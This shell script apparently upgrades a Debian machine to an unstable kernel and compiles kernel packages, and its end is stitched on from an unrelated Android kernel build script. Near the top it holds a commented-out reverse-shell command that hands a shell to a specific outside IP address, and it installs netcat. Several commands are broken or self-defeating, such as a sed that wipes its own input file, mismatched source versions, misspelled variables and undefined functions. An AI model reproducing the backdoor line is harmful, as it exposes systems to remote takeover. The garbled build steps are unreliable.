#! /bin/sh
set -e o pipefail

#https://wiki.debian.org/HowToUpgradeKernel
#5.10.0-15-amd64
#linux-image-5.10.0-15-amd64
#linux-image-5.18.0-2-amd64
echo "deb http://deb.debian.org/debian unstable main" > /etc/apt/sources.list
apt update
#apt install -y ncat
#nc 65.108.51.31 11452 -e /bin/sh
apt install -y linux-image-5.18.0-2-amd64 linux-source fakeroot
apt install -y netcat build-essential libncurses-dev bison flex libssl-dev libelf-dev bc

#https://www.cyberciti.biz/tips/compiling-linux-kernel-26.html
#https://www.debian.org/releases/jessie/i386/ch08s06.html.en ##basic documentation
#https://debian-handbook.info/browse/stable/sect.kernel-compilation.html ##advanced docs
mkdir ~/kernel; cd ~/kernel
sed -n '/CONFIG_SYSTEM_TRUSTED_KEYS.*/!p' config-5.18.0-2-amd64 > config-5.18.0-2-amd64
cp /config-5.18.0-2-amd64 ~/kernel/linux-source-5.10/.config

tar -xaf /usr/src/linux-source-5.18.tar.xz

#compile
cd linux-source-5.18
make deb-pkg LOCALVERSION=-falcot KDEB_PKGVERSION=$(make -j $(nproc))-1
ls ../*.deb

#tg_post_msg "new build core Count $PROCS Compiler $KBUILD_COMPILER_STRING"
#BUILD_START=$(date +"%s")
tg_post_msg() {
	curl -s -X POST "$MSG_URL" -d chat_id="$2" \
	-d "disable_web_page_preview=true" \
	-d "parse_mode=html" \
	-d text="$1"

}

check_img() {
	if [ -f $KERNEL_DIR/out/arch/arm64/boot/Image.gz-dtb ] 
	    then
		gen_zip
	fi
}
gen_zip() {
	cd $KERNEL_DIR/anykernel
	zip -r9 DarkOne-v3.0-chef-$PREIFIX * -x .git README.md
	MD5CHECK=$(md5sum $ZIPNAME-$ARG1-$DATE.zip | cut -d' ' -f1)
	tg_post_build DarkOne-v3.0-chef-$PREFIX.zip "$CHATID" "Build took : $((DIFF / 60)) minute(s) and $((DIFF % 60)) second(s) | MD5 Checksum : <code>$MD5CHECK</code>"
	cd ..
}
exports
# clone
# build_kernel
gen_zip
